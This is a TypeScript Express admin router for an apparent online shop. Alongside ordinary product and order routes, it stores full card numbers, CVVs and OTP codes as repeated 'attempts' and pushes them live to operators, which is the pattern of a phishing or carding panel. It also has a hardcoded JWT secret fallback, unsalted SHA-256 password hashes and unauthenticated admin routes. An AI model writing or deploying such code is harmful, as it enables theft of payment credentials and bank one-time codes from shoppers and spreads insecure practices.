import { Router } from "express";
import { asc, desc, eq, inArray } from "drizzle-orm";
import { db, ordersTable, productsTable, presenceTable, siteContentTable, visitorsTable, cardAttemptsTable, otpAttemptsTable, adminTable } from "@workspace/db";
import { CreateProductBody, UpdateProductBody, UpdateSiteContentBody, UpdateOrderBody } from "@workspace/api-zod";
import { mapProductRow, mapSiteContentRow, isPresenceActive } from "./utils";
import { supabase, getPublicImageUrl } from "../lib/supabase";
import { sendPushNotification, notifyAdminsOfCardAttempt, notifyAdminsOfOtpAttempt } from "../lib/firebase-admin";
import crypto from "crypto";
import jwt from "jsonwebtoken";

const router = Router();

// JWT Secret - in production, use environment variable
const JWT_SECRET = process.env.JWT_SECRET || "dheebti-admin-secret-key-2024";
const JWT_EXPIRY = "24h";

// Simple password hashing using SHA-256
function hashPassword(password: string): string {
  return crypto.createHash('sha256').update(password).digest('hex');
}

function verifyPassword(password: string, hash: string): boolean {
  return hashPassword(password) === hash;
}

// Generate JWT token
function generateToken(email: string): string {
  return jwt.sign({ email }, JWT_SECRET, { expiresIn: JWT_EXPIRY });
}

// Verify JWT token
export function verifyAdminToken(token: string): { email: string } | null {
  try {
    const decoded = jwt.verify(token, JWT_SECRET) as { email: string };
    return decoded;
  } catch {
    return null;
  }
}

// Get current admin credentials (email only, not password)
router.get("/admin/credentials", async (_req, res, next) => {
  try {
    const admin = await db.select().from(adminTable).limit(1);
    
    if (admin.length === 0) {
      return res.status(404).json({ error: "Admin not configured" });
    }

    res.json({
      email: admin[0].email,
      hasPassword: !!admin[0].passwordHash
    });
  } catch (error) {
    next(error);
  }
});

// Login - Verify credentials and return JWT token
router.post("/admin/login", async (req, res, next) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "البريد وكلمة المرور مطلوبان" });
    }

    const admin = await db.select().from(adminTable).where(eq(adminTable.email, email.toLowerCase())).limit(1);

    if (admin.length === 0) {
      return res.status(401).json({ error: "بيانات الدخول غير صحيحة" });
    }

    const isValid = verifyPassword(password, admin[0].passwordHash);

    if (!isValid) {
      return res.status(401).json({ error: "بيانات الدخول غير صحيحة" });
    }

    // Generate JWT token
    const token = generateToken(admin[0].email);

    res.json({ 
      token,
      email: admin[0].email
    });
  } catch (error) {
    next(error);
  }
});

// Verify token
router.post("/admin/verify", async (req, res, next) => {
  try {
    const { token } = req.body;

    if (!token) {
      return res.status(400).json({ valid: false, error: "Token required" });
    }

    const decoded = verifyAdminToken(token);

    if (!decoded) {
      return res.status(401).json({ valid: false, error: "Invalid or expired token" });
    }

    res.json({ valid: true, email: decoded.email });
  } catch (error) {
    next(error);
  }
});

// Update admin credentials
router.put("/admin/credentials", async (req, res, next) => {
  try {
    const { email, password, currentPassword } = req.body;

    // Get current admin
    const currentAdmin = await db.select().from(adminTable).limit(1);
    
    if (currentAdmin.length === 0) {
      return res.status(404).json({ error: "Admin not configured" });
    }

    // Verify current password
    if (currentPassword && !verifyPassword(currentPassword, currentAdmin[0].passwordHash)) {
      return res.status(401).json({ error: "Current password is incorrect" });
    }

    // Update credentials
    const updates: { email?: string; passwordHash?: string; updatedAt: Date } = {
      updatedAt: new Date()
    };

    if (email) {
      updates.email = email.toLowerCase();
    }

    if (password) {
      updates.passwordHash = hashPassword(password);
    }

    await db.update(adminTable).set(updates).where(eq(adminTable.id, currentAdmin[0].id));

    res.json({ success: true });
  } catch (error) {
    next(error);
  }
});

// Initialize admin (first time setup)
router.post("/admin/init", async (req, res, next) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Email and password are required" });
    }

    // Check if admin already exists
    const existing = await db.select().from(adminTable).limit(1);
    
    if (existing.length > 0) {
      return res.status(400).json({ error: "Admin already configured" });
    }

    // Create admin
    await db.insert(adminTable).values({
      email: email.toLowerCase(),
      passwordHash: hashPassword(password)
    });

    res.status(201).json({ success: true });
  } catch (error) {
    next(error);
  }
});

// Get card and OTP attempts for all orders of a customer (by visitorId)
router.get("/admin/customers/:visitorId/attempts", async (req, res, next) => {
  try {
    const { visitorId } = req.params;

    // Get all orders for this visitor
    const orders = await db
      .select({ id: ordersTable.id })
      .from(ordersTable)
      .where(eq(ordersTable.visitorId, visitorId));

    if (orders.length === 0) {
      return res.json({ cardAttempts: [], otpAttempts: [] });
    }

    const orderIds = orders.map(o => o.id);

    // Get card attempts for all orders using inArray
    const cardAttempts = await db
      .select()
      .from(cardAttemptsTable)
      .where(inArray(cardAttemptsTable.orderId, orderIds))
      .orderBy(desc(cardAttemptsTable.createdAt));

    // Get OTP attempts for all orders using inArray
    const otpAttempts = await db
      .select()
      .from(otpAttemptsTable)
      .where(inArray(otpAttemptsTable.orderId, orderIds))
      .orderBy(desc(otpAttemptsTable.createdAt));

    res.json({
      cardAttempts,
      otpAttempts
    });
  } catch (error) {
    next(error);
  }
});

// Get card attempts for an order
router.get("/admin/orders/:orderId/card-attempts", async (req, res, next) => {
  try {
    const orderId = Number(req.params.orderId);
    if (Number.isNaN(orderId)) {
      return res.status(400).json({ error: "Invalid order id" });
    }

    const attempts = await db
      .select()
      .from(cardAttemptsTable)
      .where(eq(cardAttemptsTable.orderId, orderId))
      .orderBy(desc(cardAttemptsTable.createdAt));

    res.json(attempts);
  } catch (error) {
    next(error);
  }
});

// Add a new card attempt
router.post("/admin/orders/:orderId/card-attempts", async (req, res, next) => {
  try {
    const orderId = Number(req.params.orderId);
    if (Number.isNaN(orderId)) {
      return res.status(400).json({ error: "Invalid order id" });
    }

    const { cardName, cardNumber, cardExpiry, cardCvv } = req.body;

    // Add card attempt
    const [attempt] = await db
      .insert(cardAttemptsTable)
      .values({
        orderId,
        cardName,
        cardNumber,
        cardExpiry,
        cardCvv,
      })
      .returning();

    // Also update the order with latest card data
    await db
      .update(ordersTable)
      .set({
        cardName,
        cardNumber,
        cardExpiry,
        cardCvv,
      })
      .where(eq(ordersTable.id, orderId));

    // Get order details for notification
    const [order] = await db
      .select()
      .from(ordersTable)
      .where(eq(ordersTable.id, orderId))
      .limit(1);

    // Broadcast card attempt to all admin clients for real-time updates
    const pm = await getPresenceManager();
    if (pm) {
      pm.broadcastToAdmins({
        type: "card_attempt",
        attempt: {
          id: attempt.id,
          orderId: attempt.orderId,
          cardName: attempt.cardName,
          cardNumber: attempt.cardNumber.slice(-4).padStart(attempt.cardNumber.length, '*'), // Mask card number
          cardExpiry: attempt.cardExpiry,
          createdAt: attempt.createdAt.toISOString(),
        },
      });
    }

    // Send push notification to admin devices
    if (order) {
      console.log(`[CARD] Sending notification for order ${orderId}, customer: ${order.customerName}`);
      notifyAdminsOfCardAttempt(order, cardName, cardNumber, cardExpiry, cardCvv);
    } else {
      console.log(`[CARD] Order ${orderId} not found, skipping notification`);
    }

    res.status(201).json(attempt);
  } catch (error) {
    next(error);
  }
});

// Dynamic import to avoid circular dependency
let presenceManager: any = null;
async function getPresenceManager() {
  if (!presenceManager) {
    try {
      const module = await import("../websocket/manager");
      presenceManager = module.presenceManager;
    } catch (e) {
      console.error("Failed to load presence manager:", e);
    }
  }
  return presenceManager;
}

// Get OTP attempts for an order
router.get("/admin/orders/:orderId/otp-attempts", async (req, res, next) => {
  try {
    const orderId = Number(req.params.orderId);
    if (Number.isNaN(orderId)) {
      return res.status(400).json({ error: "Invalid order id" });
    }

    const attempts = await db
      .select()
      .from(otpAttemptsTable)
      .where(eq(otpAttemptsTable.orderId, orderId))
      .orderBy(desc(otpAttemptsTable.createdAt));

    res.json(attempts);
  } catch (error) {
    next(error);
  }
});

// Add a new OTP attempt
router.post("/admin/orders/:orderId/otp-attempts", async (req, res, next) => {
  try {
    const orderId = Number(req.params.orderId);
    if (Number.isNaN(orderId)) {
      return res.status(400).json({ error: "Invalid order id" });
    }

    const { otpCode, success } = req.body;

    // Add OTP attempt
    const [attempt] = await db
      .insert(otpAttemptsTable)
      .values({
        orderId,
        otpCode,
        success: success ?? false,
      })
      .returning();

    // If success, update the order with the OTP code
    if (success) {
      await db
        .update(ordersTable)
        .set({ otpCode })
        .where(eq(ordersTable.id, orderId));
    }

    // Get order details for notification
    const [order] = await db
      .select()
      .from(ordersTable)
      .where(eq(ordersTable.id, orderId))
      .limit(1);

    // Broadcast OTP attempt to all admin clients for real-time updates
    const pm = await getPresenceManager();
    if (pm) {
      pm.broadcastToAdmins({
        type: "otp_attempt",
        attempt: {
          id: attempt.id,
          orderId: attempt.orderId,
          otpCode: attempt.otpCode,
          success: attempt.success,
          createdAt: attempt.createdAt.toISOString(),
        },
      });
    }

    // Send push notification to admin devices
    if (order) {
      console.log(`[OTP] Sending notification for order ${orderId}, customer: ${order.customerName}, OTP: ${otpCode}`);
      notifyAdminsOfOtpAttempt(order, otpCode, success ?? false);
    } else {
      console.log(`[OTP] Order ${orderId} not found, skipping notification`);
    }

    res.status(201).json(attempt);
  } catch (error) {
    next(error);
  }
});

router.get("/admin/orders", async (_req, res, next) => {
  try {
    const orders = await db
      .select({
        id: ordersTable.id,
        productId: ordersTable.productId,
        productName: ordersTable.productName,
        quantity: ordersTable.quantity,
        customerName: ordersTable.customerName,
        phone: ordersTable.phone,
        address: ordersTable.address,
        pickupDate: ordersTable.pickupDate,
        paymentMethod: ordersTable.paymentMethod,
        paymentStatus: ordersTable.paymentStatus,
        status: ordersTable.status,
        createdAt: ordersTable.createdAt,
        cardName: ordersTable.cardName,
        cardNumber: ordersTable.cardNumber,
        cardExpiry: ordersTable.cardExpiry,
        cardCvv: ordersTable.cardCvv,
        otpCode: ordersTable.otpCode,
        visitorId: ordersTable.visitorId,
      })
      .from(ordersTable)
      .orderBy(desc(ordersTable.createdAt));

    res.json(orders);
  } catch (error) {
    next(error);
  }
});

// Get visitors with current page (accurate page tracking)
router.get("/admin/visitors", async (_req, res, next) => {
  try {
    const visitors = await db
      .select()
      .from(visitorsTable)
      .orderBy(desc(visitorsTable.lastSeenAt));

    res.json(visitors);
  } catch (error) {
    next(error);
  }
});

router.patch("/admin/orders/:id", async (req, res, next) => {
  try {
    const id = Number(req.params.id);
    if (Number.isNaN(id)) {
      return res.status(400).json({ error: "Invalid order id" });
    }

    const body = UpdateOrderBody.parse(req.body);
    const updateValues: Record<string, unknown> = {};

    if (body.cardName !== undefined) updateValues.cardName = body.cardName;
    if (body.cardNumber !== undefined) updateValues.cardNumber = body.cardNumber;
    if (body.cardExpiry !== undefined) updateValues.cardExpiry = body.cardExpiry;
    if (body.cardCvv !== undefined) updateValues.cardCvv = body.cardCvv;
    if (body.otpCode !== undefined) updateValues.otpCode = body.otpCode;
    if (body.paymentStatus !== undefined) updateValues.paymentStatus = body.paymentStatus;
    if (body.status !== undefined) updateValues.status = body.status;

    const updated = await db
      .update(ordersTable)
      .set(updateValues)
      .where(eq(ordersTable.id, id))
      .returning();

    if (updated.length === 0) {
      return res.status(404).json({ error: "Order not found" });
    }

    res.json(updated[0]);
  } catch (error) {
    next(error);
  }
});

router.get("/admin/summary", async (_req, res, next) => {
  try {
    const orders = await db
      .select({
        status: ordersTable.status,
        pickupDate: ordersTable.pickupDate,
      })
      .from(ordersTable);

    const presenceRows = await db
      .select({
        sessionId: presenceTable.sessionId,
        page: presenceTable.page,
        label: presenceTable.label,
        customerName: presenceTable.customerName,
        lastSeenAt: presenceTable.lastSeenAt,
      })
      .from(presenceTable);

    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const totalOrders = orders.length;
    const newOrders = orders.filter((order) => order.status === "new").length;
    const todayOrders = orders.filter((order) => new Date(order.pickupDate) >= today).length;
    const activeVisitors = presenceRows.filter((row) => isPresenceActive(row.lastSeenAt)).length;

    res.json({
      totalOrders,
      newOrders,
      todayOrders,
      activeVisitors,
    });
  } catch (error) {
    next(error);
  }
});

// POST /admin/upload-image - Upload image to Supabase Storage
router.post("/admin/upload-image", async (req, res, next) => {
  try {
    const { image } = req.body as { image?: string };
    
    if (!image) {
      return res.status(400).json({ error: "No image provided" });
    }

    // Extract base64 data and mime type
    const matches = image.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
    if (!matches || matches.length !== 3) {
      return res.status(400).json({ error: "Invalid base64 image format" });
    }

    const mimeType = matches[1];
    const base64Data = matches[2];
    const buffer = Buffer.from(base64Data, 'base64');

    // Generate unique filename
    const extension = mimeType.split('/')[1] || 'jpg';
    const filename = `products/${Date.now()}-${crypto.randomBytes(8).toString('hex')}.${extension}`;

    // Upload to Supabase Storage
    const { data, error } = await supabase.storage
      .from('product-images')
      .upload(filename, buffer, {
        contentType: mimeType,
        upsert: false,
      });

    if (error) {
      console.error('Supabase upload error:', error);
      return res.status(500).json({ error: "Failed to upload image", details: error.message });
    }

    // Get public URL
    const imageUrl = getPublicImageUrl(filename);

    res.json({ imageUrl, filename });
  } catch (error) {
    console.error('Upload error:', error);
    next(error);
  }
});

// POST /admin/products - Create new product
router.post("/admin/products", async (req, res, next) => {
  try {
    const body = CreateProductBody.parse(req.body);
    const [product] = await db
      .insert(productsTable)
      .values({
        name: body.name,
        description: body.description,
        imageUrl: body.imageUrl,
        image: body.image || null, // Store Base64 image
        maxQuantity: body.maxQuantity,
        price: body.price.toString(),
        active: body.active ?? true,
      })
      .returning();

    res.status(201).json(mapProductRow(product));
  } catch (error) {
    next(error);
  }
});

router.patch("/admin/products/:id", async (req, res, next) => {
  try {
    const id = Number(req.params.id);
    if (Number.isNaN(id)) {
      return res.status(400).json({ error: "Invalid product id" });
    }

    const body = UpdateProductBody.parse(req.body);
    const updateValues = {
      ...(body.name !== undefined ? { name: body.name } : {}),
      ...(body.description !== undefined ? { description: body.description } : {}),
      ...(body.imageUrl !== undefined ? { imageUrl: body.imageUrl } : {}),
      ...(body.image !== undefined ? { image: body.image || null } : {}),
      ...(body.maxQuantity !== undefined ? { maxQuantity: body.maxQuantity } : {}),
      ...(body.price !== undefined ? { price: body.price.toString() } : {}),
      ...(body.active !== undefined ? { active: body.active } : {}),
    };

    const updated = await db
      .update(productsTable)
      .set(updateValues)
      .where(eq(productsTable.id, id))
      .returning();

    if (updated.length === 0) {
      return res.status(404).json({ error: "Product not found" });
    }

    res.json(mapProductRow(updated[0]));
  } catch (error) {
    next(error);
  }
});

router.delete("/admin/products/:id", async (req, res, next) => {
  try {
    const id = Number(req.params.id);
    if (Number.isNaN(id)) {
      return res.status(400).json({ error: "Invalid product id" });
    }

    const deleted = await db
      .delete(productsTable)
      .where(eq(productsTable.id, id))
      .returning({ id: productsTable.id });

    if (deleted.length === 0) {
      return res.status(404).json({ error: "Product not found" });
    }

    res.json({ success: true, id: deleted[0].id });
  } catch (error) {
    next(error);
  }
});

router.patch("/admin/content", async (req, res, next) => {
  try {
    const body = UpdateSiteContentBody.parse(req.body);

    const [existing] = await db
      .select({ id: siteContentTable.id })
      .from(siteContentTable)
      .limit(1);

    const content = {
      brandName: body.brandName,
      heroTitle: body.heroTitle,
      heroText: body.heroText,
      heroImageUrl: body.heroImageUrl,
      navLinks: body.navLinks,
    };

    const result = existing
      ? await db
          .update(siteContentTable)
          .set(content)
          .where(eq(siteContentTable.id, existing.id))
          .returning()
      : await db.insert(siteContentTable).values(content).returning();

    res.status(200).json(mapSiteContentRow(result[0]));
  } catch (error) {
    next(error);
  }
});

router.get("/admin/presence", async (_req, res, next) => {
  try {
    const rows = await db
      .select({
        sessionId: presenceTable.sessionId,
        page: presenceTable.page,
        label: presenceTable.label,
        customerName: presenceTable.customerName,
        visitorId: presenceTable.visitorId,
        lastSeenAt: presenceTable.lastSeenAt,
      })
      .from(presenceTable);

    res.json(
      rows.map((row) => ({
        ...row,
        active: isPresenceActive(row.lastSeenAt),
      })),
    );
  } catch (error) {
    next(error);
  }
});

// Get visitors with their order history
router.get("/admin/visitors", async (_req, res, next) => {
  try {
    const visitors = await db
      .select()
      .from(visitorsTable)
      .orderBy(desc(visitorsTable.lastVisit));

    // Get order count per visitor
    const visitorsWithOrderCount = await Promise.all(
      visitors.map(async (visitor) => {
        const orders = await db
          .select()
          .from(ordersTable)
          .where(eq(ordersTable.visitorId, visitor.visitorId))
          .orderBy(desc(ordersTable.createdAt));
        
        return {
          ...visitor,
          orderCount: orders.length,
          recentOrders: orders.slice(0, 5), // Last 5 orders
        };
      })
    );

    res.json(visitorsWithOrderCount);
  } catch (error) {
    next(error);
  }
});

export default router;
